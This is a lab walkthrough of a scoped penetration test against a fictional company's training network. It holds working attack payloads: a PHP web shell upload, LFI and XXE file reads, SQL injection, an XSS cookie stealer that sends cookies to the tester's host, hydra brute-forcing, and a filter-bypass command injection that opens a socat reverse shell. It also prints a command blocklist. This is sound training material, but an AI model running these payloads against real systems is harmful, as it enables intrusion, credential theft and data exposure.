


        --SCOPE


        Client wants to test both external and internal possible vulnerabilities and does not provide any credentials or any other information.

        The assesement is not evassive so we dont need to try to be stealthy.


        --External Testing

        10.129.x.x   "external" facing target services

        *.inlanefreight.local    (all subdomains)


        --Internal Testing

                172.16.8.0/23

                172.16.9.0/23

                INLANEFREIGHT.LOCAL (Active Directory domain)


        The following are out of scope for this assessment:

        Phishing/Social Engineering against any Inlanefreight employees or customers
        
        Physical attacks against Inlanefreight facilities
        
        Destructive actions or Denial of Service (DoS) testing
        
        Modifications to the environment without written consent from authorized Inlanefreight IT staff





                ///External Information Gathering

        
        We start by scanning the target host with nmap

        $ sudo nmap --open -oA inlanefreight_ept_tcp_1k -iL scope 

        the --open switch prompts nmap to show only open (or maybe) ports

        the -oA switch tells nmap to export the output in all three available file formats

        the target hosts will be inputed in the scaner via the -iL scope parameter


                 PORT    STATE SERVICE
                
                21/tcp   open  ftp
                22/tcp   open  ssh
                25/tcp   open  smtp
                53/tcp   open  domain
                80/tcp   open  http
                110/tcp  open  pop3
                111/tcp  open  rpcbind
                143/tcp  open  imap
                993/tcp  open  imaps
                995/tcp  open  pop3s
                8080/tcp open  http-proxy

                Nmap done: 1 IP address (1 host up) scanned in 2.25 seconds



        We notice 11 ports open from our quick top 1,000 port TCP scan. It seems that we are dealing with a web server that is also running some additional services such as FTP, SSH, email (SMTP, pop3, and IMAP), DNS, and at least two web application-related ports.


        We also scanned with the -A flag in the meantime to enumerate services and the operating system as well as run the default nmap scripts in all ports ( -p- ).

        $ sudo nmap --open -p- -A -oA inlanefreight_ept_tcp_all_svc -iL scope



PORT     STATE SERVICE  VERSION

21/tcp   open  ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              38 May 30 17:16 flag.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
| dns-nsid: 
|_  bind.version: 
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight
110/tcp  open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_pop3-capabilities: SASL TOP PIPELINING STLS RESP-CODES AUTH-RESP-CODE CAPA UIDL
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: LITERAL+ LOGIN-REFERRALS more Pre-login post-login ID capabilities listed have LOGINDISABLEDA0001 OK ENABLE IDLE STARTTLS SASL-IR IMAP4rev1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_imap-capabilities: LITERAL+ LOGIN-REFERRALS AUTH=PLAINA0001 post-login ID capabilities more have listed OK ENABLE IDLE Pre-login SASL-IR IMAP4rev1
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) TOP PIPELINING CAPA RESP-CODES AUTH-RESP-CODE USER UIDL
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Support Center
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.92%I=7%D=6/20%Time=62B0CA68%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,39,"\x007\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\r\x0c");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=6/2.....

Network Distance: 2 hops
Service Info: Host:  ubuntu; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   116.63 ms 10.10.14.1
2   117.72 ms 10.129.203.101



        The first thing we can see is that this is an Ubuntu host running an HTTP proxy of some kind. We can use this handy Nmap grep cheatsheet to "cut through the noise" and extract the  running services and service numbers, so we have them handy for further investigation.

        (    https://github.com/leonjza/awesome-nmap-grep    )


        $ egrep -v "^#|Status: Up" inlanefreight_ept_tcp_all_svc.gnmap | cut -d ' ' -f4- | tr ',' '\n' | \                                                               
        sed -e 's/^[ \t]*//' | awk -F '/' '{print $7}' | grep -v "^$" | sort | uniq -c \
        | sort -k 1 -nr

        So the above command  print the count number of open ports and the service these ports  running



                //DNS Zone Transfer and subdomain enum

        let's try a DNS Zone Transfer to see if we can enumerate any valid subdomains for further exploration and expand our testing scope. We know from the scoping sheet that the primary domain is INLANEFREIGHT.LOCAL, so let's see what we can find.


        $ dig axfr inlanefreight.local @10.129.203.101


        The zone transfer works, and we find 9 additional subdomains. In a real-world engagement, if a DNS Zone Transfer is not possible, we could enumerate subdomains in many ways. The DNSDumpster.com website is a quick bet. 

        If DNS were not in play, we could also perform vhost enumeration using a tool such as ffuf. Let's try it here to see if we find anything else that the zone transfer missed. 

        To fuzz vhosts, we must first figure out what the response looks like for a non-existent vhost.

        $ curl -s -I http://10.129.203.101 -H "HOST: defnotvalid.inlanefreight.local" | grep "Content-Length:"

                Content-Length: 15157

        
        $ ffuf -w namelist.txt:FUZZ -u http://10.129.203.101/ -H 'Host:FUZZ.inlanefreight.local' -fs 15157




                //Enumerating FTP


        
        $ ftp 10.129.203.101

        Connected to 10.129.203.101.
        220 (vsFTPd 3.0.3)
        Name (10.129.203.101:tester): anonymous
        331 Please specify the password.
        Password:
        230 Login successful.


        It does not look like we can access any interesting files besides one, and we also cannot change directories.Other attacks, such as an FTP Bounce Attack, are unlikely, and we don't have any information about the internal network yet. 



                //Enumerating SSH


         We'll start with a banner grab:

         $ nc -nv 10.129.203.101 22

         We can try a few combos such as admin:admin, root:toor, admin:Welcome, admin:Pass123 but have no success.


                
                //Email Services

        
        $ sudo nmap -sV -sC -p25 10.129.203.101


        Next, we'll check for any misconfigurations related to authentication. We can try to use the VRFY command to enumerate system users.

        $ telnet 10.129.203.101 25

        Trying 10.129.203.101...
        Connected to 10.129.203.101.
        Escape character is '^]'.
        220 ubuntu ESMTP Postfix (Ubuntu)
        VRFY root
        252 2.0.0 root
        VRFY www-data
        252 2.0.0 www-data
        VRFY randomuser
        550 5.1.1 <randomuser>: Recipient address rejected: User unknown in local recipient table


        We can see that the VRFY command is not disabled, and we can use this to enumerate valid users. This could potentially be leveraged to gather a list of users we could use to mount a password brute-forcing attack against the FTP and SSH services and perhaps others.

        We could attempt to enumerate more users with a tool such as smtp-user-enum to drive the point home and potentially find more users.

        (   https://github.com/pentestmonkey/smtp-user-enum  )


        The POP3 protocol can also be used for enumerating users depending on how it is set up. We can try to enumerate system users with the USER command again, and if the server replies with +OK, the user exists on the system.

        $ telnet 10.129.203.101 110

        Trying 10.129.203.101...
        Connected to 10.129.203.101.
        Escape character is '^]'.
        +OK Dovecot (Ubuntu) ready.
        user www-data
        -ERR [AUTH] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.

        We'd want to look further at the client's email implementation in a real-world assessment. If they are using Office 365 or on-prem Exchange, we may be able to mount a password spraying attack that could yield access to email inboxes or potentially the internal network if we can use a valid email password to connect over VPN.

        We may also come across an Open Relay, which we could possibly abuse for Phishing by sending emails as made-up users or spoofing an email account to make an email look official and attempt to trick employees into entering credentials or executing a payload.

        We can check for it anyways but do not find an open relay which is good for our client!

        $ nmap -p25 -Pn --script smtp-open-relay  10.129.203.101



                //Web Application Enumeration


        The quickest and most efficient way to get through a bunch of web applications is using a tool such as EyeWitness to take screenshots of each web application 

        $ cat ilfreight_subdomains

                inlanefreight.local 
                blog.inlanefreight.local 
                careers.inlanefreight.local 
                dev.inlanefreight.local 
                gitlab.inlanefreight.local 
                ir.inlanefreight.local 
                status.inlanefreight.local 
                support.inlanefreight.local 
                tracking.inlanefreight.local 
                vpn.inlanefreight.local
                monitoring.inlanefreight.local

        We can feed EyeWitness an Nmap .xml file or a Nessus scan, which is useful when we have a large scope with many open ports, which can often be the case during an Internal Penetration Test. In our case, we'll just use the -f flag to give it the list of subdomains in a text file we enumerated earlier.


        $ eyewitness -f ilfreight_subdomains -d ILFREIGHT_subdomain_EyeWitness

        [*] Done! Report written in the /home/tester/INLANEFREIGHT-IPT/Evidence/Scans/Web/ILFREIGHT_subdomain_EyeWitness folder!
        Would you like to open the report now? [Y/n]
        

        -blog.inlanefreight.local


        The site seems to be a forgotten Drupal install or perhaps a test site that was set up and never hardened
        Using cURL, we can see that Drupal 9 is in use.

        $ curl -s http://blog.inlanefreight.local | grep Drupal

        A quick Google search shows us that the current stable Drupal version intended for production is release 9.4, so we probably will have to get lucky and find some sort of misconfiguration such as a weak admin password to abuse built-in functionality or a vulnerable plugin. Well-known vulnerabilities such as Drupalgeddon 1-3 do not affect version 9.x of Drupal, so that's a dead-end. 


        -careers.inlanefreight.local


        Next up is the careers subdomain. These types of sites often allow a user to register an account, upload a CV, and potentially a profile picture. This could be an interesting avenue of attack.

        Browsing first to the login page http://careers.inlanefreight.local/login, we can try some common authentication bypasses and try fuzzing the login form to try to bypass authentication or provoke some sort of error message or time delay that would be indicative of a SQL injection.

        The http://careers.inlanefreight.local/apply page allows us to apply for a job and upload a CV. Testing this functionality shows that it allows any file type to upload, but the HTTP response does not show where the file is located after upload. Directory brute-forcing does not yield any interesting directories such as /files or /uploads that could house a web shell if we can successfully upload a malicious file.

        Let's go ahead and register an account at http://careers.inlanefreight.local/register and look around. We register an account with bogus details: test@test.com and the credentials pentester:Str0ngP@ssw0rd!. Sometimes we'll need to use an actual email address to receive an activation link. We can use a disposable email service such as 10 Minute Mail not to clutter up our inbox or keep a dummy account with ProtonMail mail or similar just for testing purposes. 

        (  https://10minutemail.com/ )


        Once registered, we can log in and browse around. We're greeted with our profile page at http://careers.inlanefreight.local/profile?id=9. Attempting to fuzz the id parameter for SQLi, command injection, file inclusion, XSS, etc., does not prove fruitful. The ID number itself is interesting. Tweaking this number shows us that we can access other users' profiles and see what jobs they applied to. This is a classic example of an Insecure Direct Object Reference (IDOR) vulnerability and would definitely be worth reporting due to the potential for sensitive data exposure.



        -dev.inlanefreight.local


        Anything with dev in the URL or name is interesting, as this could potentially be accidentally exposed and riddled with flaws/not production-ready. The application presents a simple login form titled Key VaultThis looks like a homegrown password manager or similar and could lead to considerable data exposure if we can get in. Weak password combinations and authentication bypass payloads don't get us anywhere, so let's go back to the basics and look for other pages and directories. Let's try first with the common.txt wordlist using .php file extensions for the first run.

       $ gobuster dir -u http://dev.inlanefreight.local -w /usr/share/wordlists/dirb/common.txt -x .php -t 300

       The uploads and upload.php pages immediately call our attention. If we're able to upload a PHP web shell, chances are we can browse right to it in the /uploads directory, which has directory listing enabled. We can note this down as a valid low-risk finding, Directory Listing Enabled, and capture the necessary evidence to make report writing quick and painless. Browsing to /upload.php gives us a 403 Forbidden error message and nothing more, which is interesting because the status code is a 200 OK success code. Let's dig into this deeper.


       We'll need Burp Suite here to capture the request and see if we can figure out what's going on. If we capture the request and send it to Burp Repeater and then re-request the page using the OPTIONS method, we see that various methods are allowed: GET,POST,PUT,TRACK,OPTIONS. Cycling through the various options, each gives us a server error until we try the TRACK method and see that the X-Custom-IP-Authorization: header is set in the HTTP response. 

       Playing around a bit with the request and adding the header X-Custom-IP-Authorization: 127.0.0.1 to the HTTP request in Burp Repeater and then requesting the page with the TRACK method again yields an interesting result. We see what appears to be a file upload form in the HTTP response body.

       We can click on the Browse button and attempt to upload a simple webshell with the following contents:

       <?php system($_GET['cmd']); ?>


        Save the file as 5351bf7271abaa2267e03c9ef6393f13.php or something similar. It's a good practice to create random file names when uploading a web shell to a public-facing website so a random attacker doesn't happen upon it. In our case, we'd want to use something password protected or restricted to our IP address since directory listing is enabled, and anyone could browse to the /uploads directory and find it. Attempting to upload the .php file directly results in an error: "JPG, JPEG, PNG & GIF files are allowed.", which shows that some weak client-side validation is likely in place. We can grab the POST request, send it to Repeater once again and try modifying the Content-Type: header in the request to see if we can trick the application into accepting our file as valid. We'll try altering the header to Content-Type: image/png to pass off our web shell as a valid PNG image file. It works! We get the following response: File uploaded /uploads/5351bf7271abaa2267e03c9ef6393f13.php.

        $ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=id


        Checking the host's IP addressing, it doesn't appear that we've landed inside the Inlanefreight internal network as the IP address is not within the internal network scope. This may just be a standalone web server, so we'll continue on.

        $ curl http://dev.inlanefreight.local/uploads/5351bf7271abaa2267e03c9ef6393f13.php?cmd=hostname%20-I

        From here, we can enumerate the host further, looking for sensitive data, note down another two findings: HTTP Verb Tampering and Unrestricted File Upload, and move on to the next host.


        -ir.inlanefreight.local

        The next target in our list is http://ir.inlanefreight.local, the company's Investor Relations Portal hosted with WordPress. 

        Let's fire up WPScan and see what we can enumerate using the -ap flag to enumerate all plugins.

        $ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.local

        From the scan, we can deduce the following bits of information:

            The WordPress core version is the latest (6.0 at the time of writing)
            The theme in use is cbusiness-investment
            The b2i-investor-tools plugin is installed
            The mail-masta plugin is installed



        The Mail Masta plugin is an older plugin with several known vulnerabilities. We can use this exploit to read files on the underlying file system by leveraging a Local File Inclusion (LFI) vulnerability.

        (  https://www.exploit-db.com/exploits/50226  )

        $ curl http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd



        We can add another finding to our list: Local File Inclusion (LFI). Next, let's move on and see if we can enumerate WordPress users using WPScan.

        $ wpscan -e u -t 500 --url http://ir.inlanefreight.local

        We find several users:

                ilfreightwp
                tom
                james
                john


        Let's try to brute-force one of the account passwords using this wordlist from the SecLists GitHub repo. Using WPScan again, we get a hit for the ilfreightwp account.
        (   https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top100.txt  )

        $ wpscan --url http://ir.inlanefreight.local -P passwords.txt -U ilfreightwp

        
        From here, we can browse to http://ir.inlanefreight.local/wp-login.php and log in using the credentials ilfreightwp:password1. Once logged in, we'll be directed to http://ir.inlanefreight.local/wp-admin/ where we can browse to http://ir.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty to edit the 404.php file for the inactive theme Twenty Twenty and add in a PHP web shell to get remote code execution. After editing this page and achieving code execution following the steps in the Attacking WordPress section of the Attacking Common Applications module, we can record yet another finding for Weak WordPress Admin Credentials and recommend that our client implement several hardening measures if they plan to leave this WordPress site exposed externally.



        -status.inlanefreight.local


        This site looks like another forgotten one that shouldn't be exposed to the internet. It seems like it's some sort of internal application to search through logs. Entering a single quote (') throws a MySQL error message which indicates the presence of a SQL injection vulnerability: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1. We can exploit this manually using a payload such as:


                ' union select null, database(), user(), @@version -- //

        We can also use sqlmap to exploit this also. First, capture the POST request using Burp, save it to a file, and mark the searchitem parameter with a * so sqlmap knows where to inject.

        $ sqlmap -r sqli.txt --dbms=mysql 

        Next, we can enumerate the available databases and see that the status database is particularly interesting:

        $ sqlmap -r sqli.txt --dbms=mysql --dbs

        Focusing on the status database, we find that it has just two tables:

        $ sqlmap -r sqli.txt --dbms=mysql -D status --tables



        -support.inlanefreight.local


        Moving on, we browse the http://support.inlanefreight.local site and see that it is an IT support portal. Support ticketing portals may allow us to engage with a live user and can sometimes lead to a client-side attack where we can hijack a user's session via a Cross-Site Scripting (XSS) vulnerability. Browsing around the application, we find the /ticket.php page where we can raise a support ticket.Fill out all details for a ticket and include the following in the Message field:

         "><script src=http://10.10.14.15:9000/TESTING_THIS</script>

         start a Netcat listener on port 9000 (or whatever port you desire). Click the Send button and check your listener for a callback to confirm the vulnerability.

         $ nc -lvnp 9000

        listening on [any] 9000 ...
        connect to [10.10.14.15] from (UNKNOWN) [10.129.203.101] 56202
        GET /TESTING_THIS%3C/script HTTP/1.1
        Host: 10.10.14.15:9000
        Connection: keep-alive
        User-Agent: HTBXSS/1.0
        Accept: */*
        Referer: http://127.0.0.1/
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US


        This is an example of a Blind Cross-Site Scripting (XSS) attack

        Now we need to figure out how we can steal an admin's cookie so we can log in and see what type of access we can get. We can do this by creating the following two files:

        1 )  index.php

        <?php
        if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
                $cookie = urldecode($value);
                $file = fopen("cookies.txt", "a+");
                fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
                fclose($file);
        }
        }
        ?>


        2 )  script.js


        new Image().src='http://10.10.14.15:9200/index.php?c='+document.cookie

        
        Next, start a PHP web server on your attack host as follows:

        sudo php -S 0.0.0.0:9200


        Finally, create a new ticket and submit the following in the message field:

        "><script src=http://10.10.14.15:9200/script.js></script>



        $ sudo php -S 0.0.0.0:9200

        [Tue Jun 21 00:33:27 2022] PHP 7.4.28 Development Server (http://0.0.0.0:9200) started
        [Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Accepted
        [Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 [200]: (null) /script.js
        [Tue Jun 21 00:33:42 2022] 10.129.203.101:40102 Closing
        [Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 Accepted
        [Tue Jun 21 00:33:43 2022] 10.129.203.101:40104 [500]: GET /index.php?c=session=fcfaf93ab169bc943b92109f0a845d9

        Next, we can use a Firefox plugin such as Cookie-Editor to log in using the admin's session cookie.




        -tracking.inlanefreight.local


        The site at http://tracking.inlanefreight.local/ allows us to enter a tracking number and receive a PDF showing the status of our order. The application takes user input and generates a PDF document. Upon PDF generation, we can see that the Tracking #: field takes any input (not just numbers) that we specify in the search box before hitting the Track Now button. If we insert a simple JavaScript payload such as <script>document.write('TESTING THIS')</script> and click Track Now, we see that the PDF is generated and the message TESTING THIS is rendered, which seems to mean that the JavaScript code is executing when the webserver generates the document.


        We notice that we can inject HTML as well. A simple payload such as <h1>test</h1> will render in the Tracking #: field upon PDF generation as well. Googling for something such as pdf HTML injection vulnerability returns several interesting hits such as this post and this post discussing leveraging HTML injection, XSS, and SSRF for local file read. 

        (  https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90    )

        (  https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f   )



        --Dealing with The Unexpected

        Let's dig through some of these writeups and see if we can produce a similar result and gain local file read. Following this post  (  https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f  ), let's test for local file read using XMLHttpRequest (XHR) objects and also consulting this excellent post (  https://web.archive.org/web/20221207162417/https://blog.noob.ninja/local-file-read-via-xss-in-dynamically-generated-pdf/  ) on local file read via XSS in dynamically generated PDFS. We can use this payload to test for file read, first trying for the /etc/passwd file, which is world-readable and should confirm the vulnerability's existence.

        <script>
	x=new XMLHttpRequest;
	x.onload=function(){  
	document.write(this.responseText)};
	x.open("GET","file:///etc/passwd");
	x.send();
	</script>

        We paste the payload into the search box and hit the Track Now button and the newly generated PDF displays the file's contents back to us, so we have local file read!

        

        -vpn.inlanefreight.local

        It's common to come across VPN and other remote access portals during a penetration testing engagement. This appears to be a Fortinet SSL VPN login portal. During testing, we confirmed that the version in use was not vulnerable to any known exploits. This could be an excellent candidate for password spraying in a real-world engagement, provided we take a careful and measured approach to avoid account lockout.


        -gitlab.inlanefreight.local

        Many companies host their own GitLab instances and sometimes don't lock them down properly. 

        Occasionally we will come across a GitLab instance that is not adequately secured. If we can gain access to a GitLab instance, it is worth digging around to see what type of data we can find. We may discover configuration files containing passwords, SSH keys, or other information that could lead to furthering our access. After registering, we can browse to /explore to see what projects, if any, we have access to. We can see that we can access the shopdev2.inlanefreight.local project, which gives us a hint to another subdomain that we did not uncover using the DNS Zone Transfer and likely could not find using subdomain brute-forcing.


        -shopdev2.inlanefreight.local

        Browsing to http://shopdev2.inlanefreight.local, we're redirected to a /login.php login page. Typical authentication bypasses don't get us anywhere

        Sometimes it's the simplest things that work (and yes, we do see this type of stuff in production, both internal AND external) and can log in with admin:admin. Once logged in, we see some sort of online store for purchasing wholesale products. When we see dev in a URL (especially external-facing), we can assume it is not production-ready and worth digging into, especially because of the comment Checkout Process not Implemented near the bottom of the page.

        We can test the search for injection vulnerabilities and search around for IDORs and other flaws but don't find anything particularly interesting. Let's test the purchasing flow, focusing on the shopping cart checkout process and capture the requests in Burp Suite. Add an item or two to the cart and browse to /cart.php and click the I AGREE button so we can analyze the request in Burp. Looking at Burp, we see that a POST request is made with XML in the body like so:

        <?xml version="1.0" encoding="UTF-8"?>
                <root>
                  <subtotal>
                    undefined
                  </subtotal>
                  <userid>
                    1206
                  </userid>
                </root>


         this looks like a good candidate for XML External Entity (XXE) Injection because the form seems to be sending data to the server in XML format. We try a few payloads and finally can achieve local file read to view the contents of the /etc/passwd file with this payload:

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE userid [
        <!ENTITY xxetest SYSTEM "file:///etc/passwd">
        ]>
        <root>
                <subtotal>
                        undefined
                </subtotal>
                <userid>
                        &xxetest;
                </userid>
        </root>




        -monitoring.inlanefreight.local
        
        
        
        Browsing to http://monitoring.inlanefreight.local results in a redirect to /login.php. We can try some authentication bypass payloads and common weak credential pairs but don't get anywhere, just receiving the Invalid Credentials! error every time. Since this is a login form, it is worth exploring further so we can fuzz it a bit with Burp Intruder to see if we can provoke an error message indicative of a SQL injection vulnerability, but we are not successful.toring.inlanefreight.local



        We'll set up hydra to perform the brute-forcing attack, specifying the Invalid Credentials! error message to filter out invalid login attempts. We get a hit for the credential pair admin:12qwaszx, a common "keyboard walk" password that is easy to remember but can be very easily brute-forced/cracked.


        $ hydra -l admin -P /usr/share/secLists/Passwords/darkweb2017-top100.txt monitoring.inlanefreight.local http-post-form "/login.php:username=admin&password=^PASS^:Invalid Credentials!"
       

       Once logged in, we are presented with some sort of monitoring console. If we type help, we are presented with a list of commands. This seems like a restricted shell environment to perform limited tasks and something very dangerous that should not be exposed externally.


       We walk through each of the commands. Trying cat /etc/passwd does not work, so it does appear that we are indeed in a restricted environment. whoami and date provide us with some basic information. We don't want to reboot the target and cause a service disruption. We are unable to cd to other directories. Typing ls shows us a few files that are likely stored in the directory that we are currently restricted to.

       Looking through the files, we find an authentication service and also that we are inside a container. The last option in the list is connection_test. Typing that in yields a Success message and nothing more. Going back over to Burp Suite and proxying the request, we see that a GET request is made to /ping.php for the localhost IP 127.0.0.1, and the HTTP response shows a single successful ping attack. We can infer that the /ping.php script is running an operating command using a PHP function such as shell_exec(ping -c 1 127.0.0.1) or perhaps similar using the system() function to execute a command. If this script is coded improperly, it could easily result in a command injection vulnerability, so let's try some common payloads.

        There seems to be some sort of filtering in place because trying standard payloads like GET /ping.php?ip=%127.0.0.1;id and GET /ping.php?ip=%127.0.0.1|id result in an Invalid input error, meaning there is probably a character blacklist in play. We can bypass this filter by using a line feed character %0A (or new-line character) as our injection operator following the methodology discussed in the Bypassing Space Filters section. We can make a request appending the new-line character like so GET /ping.php?ip=127.0.0.1%0a, and the ping is still successful, meaning the character is not blacklisted.

        We've won the first battle, but there seems to be another type of filter in place, as trying something like GET /ping.php?ip=127.0.0.1%0aid still results in an Invalid input error. Next, we can play around with the command syntax and see that we can bypass the second filter using single quotes. Switching to cURL, we can run the id command as follows:

        $ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"


        We have achieved command execution as the webdev user. Digging around a bit more, we see that this host has multiple IP addresses, one of which places it inside the 172.16.8.0/23 network that was part of the initial scope. If we can gain stable access to this host, we may be able to pivot into the internal network and start attacking the Active Directory domain.


        $ curl "http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"

        t we can use the ($IFS) Linux Environment Variable to bypass space restrictions. We can combine this with the new-line character bypass and start enumerating ways to obtain a reverse shell. To aid us, let's take a look at the ping.php file to get an understanding of what is being filtered so we can limit the amount of guesswork needed.

        t GET /ping.php?ip=127.0.0.1%0a'c'at${IFS}ping.php



        <?php
        ini_set('display_errors', 1);
        ini_set('display_startup_errors', 1);
        error_reporting(E_ALL);
        $output = '';

        function filter($str)
        {
        $operators = ['&', '|', ';', '\\', '/', ' '];
        foreach ($operators as $operator) {
        if (strpos($str, $operator)) {
        return true;
        }
        }
        $words = ['whoami', 'echo', 'rm', 'mv', 'cp', 'id', 'curl', 'wget', 'cd', 'sudo', 'mkdir', 'man', 'history', 'ln', 'grep', 'pwd', 'file', 'find', 'kill', 'ps', 'uname', 'hostname', 'date', 'uptime', 'lsof', 'ifconfig', 'ipconfig', 'ip', 'tail', 'netstat', 'tar', 'apt', 'ssh', 'scp', 'less', 'more', 'awk', 'head', 'sed', 'nc', 'netcat'];
        foreach ($words as $word) {
        if (strpos($str, $word) !== false) {
        return true;
        }
        }

        return false;
        }

        if (isset($_GET['ip'])) {
        $ip = $_GET['ip'];
        if (filter($ip)) {
        $output = "Invalid input";
        } else {
        $cmd = "bash -c 'ping -c 1 " . $ip . "'";
        $output = shell_exec($cmd);
        }
        }
        ?>
        <?php
        echo $output;
        ?>
        
        
        We can see that the majority of options for getting a reverse shell are filtered which will make things difficult, however one that is not is socat. Socat is a versatile tool that can be used for catching shells, and even pivoting as we have seen in the Pivoting, Tunneling, and Port Forwarding module. Let's check and see if it's available to us on the system. Heading back to Burp and using the request GET /ping.php?ip=127.0.0.1%0a'w'h'i'ch${IFS}socat shows us that it is on the system, located at /usr/bin/socat.





                        //Getting a Reverse Shell

        ur base command will be as follows, but we'll need to tweak it some to get past the filtering:

        socat TCP4:10.10.14.5:8443 EXEC:/bin/bash

        We can modify this command to give us a payload to catch a reverse shell.

        GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash HTTP/1.1


        Start a Netcat listener on the port used in the Socat command (8443 here) and execute the above request in Burp Repeater. 

        Next, we'll need to upgrade to an interactive TTY

        We'll start a Socat listener on our attack host.

        Gkaranikas@htb[/htb]$ socat file:`tty`,raw,echo=0 tcp-listen:4443


        Next, we'll execute a Socat one-liner on the target host.

        $socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:4443

        The results of the id command are immediately interesting. The Privileged Groups section of the Linux Privilege Escalation module shows an example of users in the adm group having rights to read ALL logs stored in /var/log. Perhaps we can find something interesting there. We can use aureport to read audit logs on Linux systems, with the man page describing it as "aureport is a tool that produces summary reports of the audit system logs."

        $ aureport --tty | less

        After running the command, type q to return to our shell. From the above output, it looks like a user was trying to authenticate as the srvadm user, and we have a potential credential pair srvadm:ILFreightnixadm!. Using the su command, we can authenticate as the srvadm user.

        $ su srvadm



                        //Post exploitation

        
        Now that we have credentials (srvadm:ILFreightnixadm!), we can leverage the SSH port we saw open earlier and connect in for a stable connection. This is important because we want to be able to get back as close as possible to the same spot at the start of testing each day, so we don't have to waste time on setup. Now we won't always have SSH open to the internet and may have to achieve persistence another way. We could create a reverse shell binary on the host, execute it via the command injection, get a reverse shell or Meterpreter shell, and then work through that. Since SSH is here, we'll use it. It's also good to have a backup way to get back in when using someone's credentials, as they may notice that their account is compromised or just hit that time of the month when they are prompted to change their password, and we won't be able to connect back in the next day. 



        -Local Privilege Escalation


        $ sudo -l
